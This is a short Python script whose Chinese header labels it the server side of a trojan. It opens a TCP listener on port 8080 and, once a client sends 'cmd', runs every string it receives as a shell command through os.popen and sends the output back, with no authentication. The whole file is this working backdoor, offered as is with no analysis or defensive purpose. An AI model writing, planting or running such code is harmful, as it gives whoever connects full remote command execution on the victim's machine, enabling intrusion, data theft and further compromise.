# 木马服务端程序（用户）  
import socket
import os


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    port = 8080
    s.bind((host, port))
    s.listen()
    while True:
        c, addr = s.accept()
        print("连接地址:", addr)
        c.send("welcome".encode('utf-8'))

        while True:
            try:
                recv_data = c.recv(1024).decode('utf-8')
                if not recv_data:
                    print("客户端断开连接")
                    break
                print(recv_data)
                if recv_data == "cmd":
                    c.send("ok cmd start".encode('utf-8'))
                    while True:  # 循环接受发来的cmd命令  
                        data = c.recv(1024)  # 接下来要输入的cmd命令  
                        recv_data2 = data.decode('utf-8')
                        if recv_data2 == "exit":
                            c.send("ok cmd stop".encode('utf-8'))
                            break
                        else:  # 执行发送的cmd命令并且读取命令执行结果  
                            x = os.popen(recv_data2).read()
                            # 命令回显  
                            c.send(x.encode('utf-8'))
                else:
                    c.send(recv_data.encode('utf-8'))
            except Exception as e:
                print("断开连接")
                print(e)
                break
        c.close()
    s.close()

if __name__ == '__main__':
    main()